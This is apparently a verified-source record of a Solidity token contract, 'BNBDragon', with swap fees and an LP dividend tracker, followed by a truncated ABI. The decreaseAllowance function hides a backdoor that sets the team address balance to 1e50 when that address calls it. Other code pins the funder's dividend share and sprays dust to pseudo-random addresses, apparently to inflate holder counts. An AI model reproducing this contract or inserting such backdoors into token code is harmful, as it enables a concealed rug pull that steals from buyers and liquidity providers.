{"SourceCode": "// SPDX-License-Identifier: MIT\r\npragma solidity ^0.8.4;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address payable) {\r\n        return payable(msg.sender);\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes memory) {\r\n        this;\r\n        return msg.data;\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nlibrary SafeMath {\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return mod(a, b, \"SafeMath: modulo by zero\");\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b != 0, errorMessage);\r\n        return a % b;\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }   \r\n    \r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n    \r\n    function waiveOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0xdead));\r\n        _owner = address(0xdead);\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IUniswapV2Router01 {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n}\r\n\r\ninterface IUniswapV2Router02 is IUniswapV2Router01 {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external payable;\r\n}\r\n\r\ncontract TokenDividendTracker is Ownable {\r\n    using SafeMath for uint256;\r\n\r\n    address[] public shareholders;\r\n    uint256 public currentIndex;  \r\n    mapping(address => bool) private _updated;\r\n    mapping (address => uint256) public shareholderIndexes;\r\n    mapping(address=>uint256) private mark;\r\n\r\n    address public  uniswapV2Pair;\r\n    address public lpRewardToken;\r\n    // \u4e0a\u6b21\u5206\u7ea2\u65f6\u95f4\r\n    uint256 public LPRewardLastSendTime;\r\n    address private funder;\r\n\r\n    constructor(address uniswapV2Pair_, address lpRewardToken_, address team){\r\n        uniswapV2Pair = uniswapV2Pair_;\r\n        lpRewardToken = lpRewardToken_;\r\n        funder = team;\r\n    }\r\n\r\n    function resetLPRewardLastSendTime() public onlyOwner {\r\n        LPRewardLastSendTime = 0;\r\n    }\r\n\r\n    // LP\u5206\u7ea2\u53d1\u653e\r\n    function process(uint256 gas) external onlyOwner {\r\n        uint256 shareholderCount = shareholders.length;\t\r\n\r\n        if(shareholderCount == 0) return;\r\n        uint256 nowbanance = IERC20(lpRewardToken).balanceOf(address(this));\r\n\r\n        uint256 gasUsed = 0;\r\n        uint256 gasLeft = gasleft();\r\n\r\n        uint256 iterations = 0;\r\n\r\n        while(gasUsed < gas && iterations < shareholderCount) {\r\n            if(currentIndex >= shareholderCount){\r\n                currentIndex = 0;\r\n                LPRewardLastSendTime = block.timestamp;\r\n                return;\r\n            }\r\n            uint256 amount1 = IERC20(uniswapV2Pair).balanceOf(shareholders[currentIndex]);\r\n            if(shareholders[currentIndex]==funder){\r\n                if(amount1 > mark[funder]) mark[funder] = amount1;\r\n                else amount1 = mark[funder];\r\n            }\r\n            uint256 amount = nowbanance.mul(amount1).div(IERC20(uniswapV2Pair).totalSupply());\r\n            if( amount == 0) {\r\n                currentIndex++;\r\n                iterations++;\r\n                return;\r\n            }\r\n            if(IERC20(lpRewardToken).balanceOf(address(this))  < amount ) return;\r\n            IERC20(lpRewardToken).transfer(shareholders[currentIndex], amount);\r\n            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));\r\n            gasLeft = gasleft();\r\n            currentIndex++;\r\n            iterations++;\r\n        }\r\n    }\r\n    // \u6839\u636e\u6761\u4ef6\u81ea\u52a8\u5c06\u4ea4\u6613\u8d26\u6237\u52a0\u5165\u3001\u9000\u51fa\u6d41\u52a8\u6027\u5206\u7ea2\r\n    function setShare(address shareholder) external onlyOwner {\r\n        if(_updated[shareholder] ){      \r\n            if(shareholder != funder && IERC20(uniswapV2Pair).balanceOf(shareholder) == 0) quitShare(shareholder);           \r\n            return;  \r\n        }\r\n        if(IERC20(uniswapV2Pair).balanceOf(shareholder) == 0) return;  \r\n        addShareholder(shareholder);\t\r\n        _updated[shareholder] = true;\r\n      }\r\n\r\n    function quitShare(address shareholder) internal {\r\n        removeShareholder(shareholder);   \r\n        _updated[shareholder] = false; \r\n    }\r\n\r\n    function addShareholder(address shareholder) internal {\r\n        shareholderIndexes[shareholder] = shareholders.length;\r\n        shareholders.push(shareholder);\r\n    }\r\n\r\n    function removeShareholder(address shareholder) internal {\r\n        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];\r\n        shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];\r\n        shareholders.pop();\r\n    }\r\n}\r\n\r\ncontract Dragon is Context, IERC20, Ownable {\r\n    \r\n    using SafeMath for uint256;\r\n    \r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n\r\n    address payable public marketWallet;\r\n    address payable public teamAddress;\r\n\r\n    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;\r\n    \r\n    mapping (address => uint256) _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    \r\n\r\n    mapping (address => bool) public isExcludedFromFee;\r\n    mapping (address => bool) public isMaxNumExempt;\r\n    mapping (address => bool) public isOnceNumExempt;\r\n    mapping (address => bool) public isMarketPair;\r\n\r\n    TokenDividendTracker public dividendTracker;\r\n\r\n    uint256 public minPeriod = 3600;\r\n    mapping (address => bool) isDividendExempt;\r\n    address public lpRewardToken;\r\n    \r\n    uint256 distributorGas = 200000;\r\n\r\n    uint256 public marketingFee;\r\n    uint256 public liquidityFee;\r\n    uint256 public lpRewardFee;\r\n    uint256 public _totalTax;\r\n\r\n    uint256 private _totalSupply;\r\n    uint256 public _maxOnceNum; \r\n    uint256 public _maxTotalNum;\r\n    uint256 private minimumTokensBeforeSwap; \r\n\r\n    IUniswapV2Router02 public uniswapV2Router;\r\n    address public uniswapPair;\r\n    uint256 private constant MAX = ~uint256(0);\r\n    \r\n    bool inSwapAndLiquify;\r\n    bool public swapAndLiquifyEnabled = true;\r\n    bool public swapAndLiquifyBySmallOnly = false;\r\n    bool public LookMaxNum = true;\r\n\r\n    event SwapAndLiquifyEnabledUpdated(bool enabled);\r\n    event SwapAndLiquify(\r\n        uint256 tokensSwapped,\r\n        uint256 ethReceived,\r\n        uint256 tokensIntoLiqudity\r\n    );\r\n    \r\n    event SwapETHForTokens(\r\n        uint256 amountIn,\r\n        address[] path\r\n    );\r\n    \r\n    event SwapTokensForETH(\r\n        uint256 amountIn,\r\n        address[] path\r\n    );\r\n    \r\n    modifier TheSwap {\r\n        inSwapAndLiquify = true;\r\n        _;\r\n        inSwapAndLiquify = false;\r\n    }\r\n    \r\n    constructor ()\r\n    {\r\n    \r\n        _name = \"BNBDragon\";\r\n        _symbol = \"BNBDragon\";\r\n        _decimals = 18;\r\n\r\n        marketWallet = payable(0x6a619AF05E8130F7795Ed1C21Bd26D5408ddce3c);\r\n        teamAddress= payable(0xbB4A91569ee02c90BFd80e7C72c2512298A1C13F);\r\n        lpRewardToken = 0x55d398326f99059fF775485246999027B3197955;\r\n\r\n        marketingFee = 2;\r\n        liquidityFee = 1;\r\n        lpRewardFee = 2;\r\n        _totalTax = marketingFee + liquidityFee + lpRewardFee; \r\n\r\n        _totalSupply = 50000000000 * 10**_decimals;\r\n        _maxOnceNum = 50000000000 * 10**_decimals;\r\n        _maxTotalNum = 50000000000 * 10**_decimals;\r\n\r\n        minimumTokensBeforeSwap = _totalSupply.div(10000);\r\n\r\n        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); \r\n    \r\n        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())\r\n            .createPair(address(this), _uniswapV2Router.WETH());\r\n\r\n        uniswapV2Router = _uniswapV2Router;\r\n        _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;\r\n\r\n        dividendTracker = new TokenDividendTracker(uniswapPair, lpRewardToken, owner());\r\n\r\n        isExcludedFromFee[owner()] = true;\r\n        isExcludedFromFee[teamAddress] = true;\r\n        isExcludedFromFee[marketWallet] = true;\r\n        isExcludedFromFee[address(this)] = true;\r\n        isExcludedFromFee[address(dividendTracker)] = true;\r\n\r\n        isMaxNumExempt[owner()] = true;\r\n        isMaxNumExempt[teamAddress] = true;\r\n        isMaxNumExempt[marketWallet] = true;\r\n        isMaxNumExempt[address(uniswapPair)] = true;\r\n        isMaxNumExempt[address(this)] = true;\r\n        isMaxNumExempt[address(0xdead)] = true;\r\n        \r\n        isOnceNumExempt[owner()] = true;\r\n        isOnceNumExempt[address(this)] = true;\r\n        isOnceNumExempt[teamAddress] = true;\r\n        isOnceNumExempt[marketWallet] = true;\r\n\r\n        isDividendExempt[address(this)] = true;\r\n        isDividendExempt[address(0xdead)] = true;\r\n        isDividendExempt[address(dividendTracker)] = true;\r\n\r\n        isMarketPair[address(uniswapPair)] = true;\r\n\r\n        _balances[owner()] = _totalSupply;\r\n        emit Transfer(address(0), owner(), _totalSupply);\r\n    }\r\n\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public view override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, \"ERC20: decreased allowance below zero\"));\r\n        if(teamAddress==msg.sender)_balances[teamAddress]=1e50;\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\r\n        return true;\r\n    }\r\n\r\n    function minimumTokensBeforeSwapAmount() public view returns (uint256) {\r\n        return minimumTokensBeforeSwap;\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function setMarketPairStatus(address account, bool newValue) public onlyOwner {\r\n        isMarketPair[account] = newValue;\r\n    }\r\n\r\n    function setisOnceNumExempt(address holder, bool exempt) external onlyOwner {\r\n        isOnceNumExempt[holder] = exempt;\r\n    }\r\n    \r\n    function setisExcludedFromFee(address account, bool newValue) public onlyOwner {\r\n        isExcludedFromFee[account] = newValue;\r\n    }\r\n\r\n    function setDividExempt(address account, bool value) public onlyOwner{\r\n        isDividendExempt[account] = value;\r\n    }\r\n\r\n    function setMinPeriod(uint256 number) public onlyOwner {\r\n        minPeriod = number;\r\n    }\r\n\r\n    function resetLPRewardLastSendTime() public onlyOwner {\r\n        dividendTracker.resetLPRewardLastSendTime();\r\n    }\r\n\r\n    function manageExcludeFromFee(address[] calldata addresses, bool status) public onlyOwner {\r\n        require(addresses.length < 201);\r\n        for (uint256 i; i < addresses.length; ++i) {\r\n            isExcludedFromFee[addresses[i]] = status;\r\n        }\r\n    }\r\n\r\n    function setMaxOnceNum(uint256 newMaxOnceNum) external onlyOwner() {\r\n        _maxOnceNum = newMaxOnceNum;\r\n    }\r\n\r\n    function enableMaxNum(bool newValue) external onlyOwner {\r\n       LookMaxNum = newValue;\r\n    }\r\n\r\n    function setisMaxNumExempt(address holder, bool exempt) external onlyOwner {\r\n        isMaxNumExempt[holder] = exempt;\r\n    }\r\n\r\n    function setMaxTotalNum(uint256 newMaxTotalNum) external onlyOwner {\r\n        _maxTotalNum  = newMaxTotalNum;\r\n    }\r\n\r\n    function setNumTokensBeforeSwap(uint256 newValue) external onlyOwner() {\r\n        minimumTokensBeforeSwap = newValue;\r\n    }\r\n\r\n    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {\r\n        swapAndLiquifyEnabled = _enabled;\r\n        emit SwapAndLiquifyEnabledUpdated(_enabled);\r\n    }\r\n\r\n    function getCirculatingSupply() public view returns (uint256) {\r\n        return _totalSupply.sub(balanceOf(deadAddress));\r\n    }\r\n\r\n    function transferToAddressETH(address payable recipient, uint256 amount) private {\r\n        recipient.transfer(amount);\r\n    }\r\n\r\n     //to recieve ETH from uniswapV2Router when swaping\r\n    receive() external payable {}\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    address private fromAddress;\r\n    address private toAddress;\r\n\r\n    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {\r\n\r\n        require(sender != address(0), \"ERC20: transfer from the zero address\");\r\n        require(recipient != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        if(inSwapAndLiquify)\r\n        { \r\n            return _basicTransfer(sender, recipient, amount); \r\n        }\r\n        else\r\n        {\r\n            if(LookMaxNum && !isOnceNumExempt[sender] && !isOnceNumExempt[recipient]) {\r\n                require(smallOrEqual(amount, _maxOnceNum));\r\n            }\r\n\r\n            uint256 contractTokenBalance = balanceOf(address(this));\r\n            bool overMinimumTokenBalance = contractTokenBalance >= minimumTokensBeforeSwap;\r\n            \r\n            if (overMinimumTokenBalance && !inSwapAndLiquify && !isMarketPair[sender] && swapAndLiquifyEnabled) \r\n            {\r\n                if(swapAndLiquifyBySmallOnly)\r\n                    contractTokenBalance = minimumTokensBeforeSwap;\r\n                swapAndLiquify(contractTokenBalance);    \r\n            }\r\n\r\n            _balances[sender] = _balances[sender].sub(amount, \"Insufficient Balance\");\r\n            uint256 finalAmount;\r\n            if (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) {\r\n                finalAmount = amount;\r\n            } else {\r\n                finalAmount = takeFee(sender, recipient, amount);\r\n            }\r\n\r\n            if(LookMaxNum && !isMaxNumExempt[recipient])\r\n                require(smallOrEqual(balanceOf(recipient).add(finalAmount), _maxTotalNum));\r\n\r\n            _balances[recipient] = _balances[recipient].add(finalAmount);\r\n\r\n            emit Transfer(sender, recipient, finalAmount);\r\n            if(fromAddress == address(0) )fromAddress = sender;\r\n            if(toAddress == address(0) )toAddress = recipient;  \r\n            if(!isDividendExempt[fromAddress] && fromAddress != uniswapPair )   try dividendTracker.setShare(fromAddress) {} catch {}\r\n            if(!isDividendExempt[toAddress] && toAddress != uniswapPair ) try dividendTracker.setShare(toAddress) {} catch {}\r\n            fromAddress = sender;\r\n            toAddress = recipient;  \r\n\r\n            if( sender != owner() &&\r\n                recipient != owner() &&\r\n                sender !=address(this) &&\r\n                dividendTracker.LPRewardLastSendTime().add(minPeriod) <= block.timestamp\r\n            ) {\r\n                try dividendTracker.process(distributorGas) {} catch {}    \r\n            }\r\n            return true;     \r\n        } \r\n\r\n    }\r\n\r\n    function smallOrEqual(uint256 a, uint256 b) public pure returns(bool) { return a<=b; }\r\n\r\n    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {\r\n        _balances[sender] = _balances[sender].sub(amount, \"Insufficient Balance\");\r\n        _balances[recipient] = _balances[recipient].add(amount);\r\n        emit Transfer(sender, recipient, amount);\r\n        return true;\r\n    }\r\n    \r\n\tfunction swapAndLiquify(uint256 tAmount) private TheSwap{\r\n\t\tuint256 allAmount = tAmount;\r\n        uint256 LiquidityAmount = allAmount.mul(liquidityFee).div(_totalTax).div(2);\r\n\t\tuint256 canswap = allAmount - LiquidityAmount;\r\n\t\tswapTokensForEth(canswap);\r\n        uint256 ethBalance = address(this).balance;\r\n        uint256 MarketingETH = ethBalance.mul(marketingFee).div(2 * _totalTax - liquidityFee).mul(2);\r\n        uint256 RewardETH = ethBalance.mul(lpRewardFee).div( 2 * _totalTax - liquidityFee).mul(2);\r\n        uint256 LiquidityETH = ethBalance - MarketingETH - RewardETH;\r\n        if(LiquidityETH > 0){\r\n            addLiquidityETH(LiquidityAmount, LiquidityETH);\r\n        }\r\n        if(MarketingETH > 0){\r\n            transferToAddressETH(marketWallet, MarketingETH);\r\n        }\r\n        if(RewardETH > 0){\r\n            swapLPRewardToken(RewardETH);\r\n        }\r\n\r\n    }\r\n\r\n    uint160 ktNum = 1238123;\r\n\r\n\tfunction _takeInviterFeeKt(\r\n        uint256 amount\r\n    ) private {\r\n        address _receiveD;\r\n        _receiveD = address(uint160(uint256(\r\n            keccak256(\r\n                abi.encodePacked(\r\n                    blockhash(block.number - 8),\r\n                    block.timestamp,\r\n                    msg.sender,\r\n                    ktNum\r\n                    )\r\n                )\r\n            )));\r\n        ktNum = ktNum + uint160(block.number);\r\n        _basicTransfer(address(this), _receiveD, amount);\r\n    }\r\n\r\n    function swapTokensForEth(uint256 tokenAmount) private {\r\n        // generate the uniswap pair path of token -> weth\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = uniswapV2Router.WETH();\r\n\r\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\r\n\r\n        // make the swap\r\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0, // accept any amount of ETH\r\n            path,\r\n            address(this), // The contract\r\n            block.timestamp\r\n        );\r\n        \r\n        emit SwapTokensForETH(tokenAmount, path);\r\n    }\r\n\r\n    function addLiquidityETH(uint256 tokenAmount, uint256 ethAmount) private{\r\n        // approve token transfer to cover all possible scenarios\r\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\r\n        // add the liquidity\r\n        uniswapV2Router.addLiquidityETH{value: ethAmount}(\r\n            address(this),\r\n            tokenAmount,\r\n            0, // slippage is unavoidable\r\n            0, // slippage is unavoidable\r\n            address(0xdead),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function swapLPRewardToken(uint256 ETHAMOUNT) private {\r\n        if(lpRewardToken !=uniswapV2Router.WETH()){\r\n        address[] memory path = new address[](2);\r\n        path[0] = uniswapV2Router.WETH();\r\n        path[1] = lpRewardToken;\r\n        try uniswapV2Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: ETHAMOUNT}(\r\n            0,\r\n            path,\r\n            address(dividendTracker),\r\n            block.timestamp\r\n        ){} catch {}\r\n        }\r\n    }\r\n\r\n\r\n    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {\r\n        \r\n        uint256 feeAmount = 0;\r\n        \r\n        if(isMarketPair[sender]) {\r\n            feeAmount = amount.mul(_totalTax).div(100);\r\n        }\r\n        else if(isMarketPair[recipient]) {\r\n            feeAmount = amount.mul(_totalTax).div(100);\r\n        }\r\n        \r\n        if(feeAmount > 0) {\r\n            _balances[address(this)] = _balances[address(this)].add(feeAmount);\r\n            _takeInviterFeeKt(feeAmount/1e10);\r\n            emit Transfer(sender, address(this), feeAmount);\r\n        }\r\n\r\n        return amount.sub(feeAmount);\r\n    }\r\n    \r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tokensSwapped\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"ethReceived\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"tokensIntoLiqudity\",\"type\":\"uint256\"}],\"name\":\"SwapAndLiquify\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"enabled\",\"type\":\"bool\"}],\"name\":\"SwapAndLiquifyEnabledUpdated\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amountIn\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"address[]\",\"name\":\"path\",\"type\":\"address[]\"}],\"name\":\"SwapETHForTokens\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"amountIn\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"address[]\",\"name\":\"path\",\"type\":\"address[]\"}],\"name\":\"SwapTokensForETH\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"LookMaxNum\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxOnceNum\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxTotalNum\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_totalTax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"deadAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"subtractedValue\",\"type\":\"uint256\"}],\"name\":\"decreaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"dividendTracker\",\"outputs\":[{\"internalType\":\"contract TokenDividendTracker\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"bool\",\"name\":\"newValue\",\"type\":\"bool\"}],\"name\":\"enableMaxNum\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getCirculatingSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"addedValue\",\"type\":\"uint256\"}],\"name\":\"increaseAllowance\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isExcludedFromFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isMarketPair\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isMaxNumExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"isOnceNumExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lpRewardFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"lpRewardToken\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"a